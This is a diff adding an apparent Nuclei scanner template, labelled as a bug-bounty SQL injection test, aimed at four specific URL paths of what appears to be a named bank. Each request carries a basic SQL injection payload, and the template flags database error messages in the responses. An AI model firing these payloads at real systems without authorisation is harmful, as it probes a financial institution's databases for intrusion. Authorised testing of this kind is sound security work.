@@ -1,0 +1,32 @@
+id: alfabank-sqli-test
+
+info:
+  name: Alfabank - SQL Injection Test
+  author: bugbounty
+  severity: high
+  description: SQL injection in query parameters
+  tags: sqli,alfabank
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/company/view?company_id=1' OR '1'='1"
+      - "{{BaseURL}}/order/view?order_id=1' OR '1'='1"
+      - "{{BaseURL}}/about/tender/now/tender.html?id=1' AND 1=1--"
+      - "{{BaseURL}}/node/2471?page=1' UNION SELECT NULL--"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "ORA-01"
+          - "PostgreSQL"
+          - "Microsoft SQL Server"
+        part: body
+
+      - type: regex
+        regex:
+          - "You have an error in your SQL syntax"
+          - "Warning: mysql_"
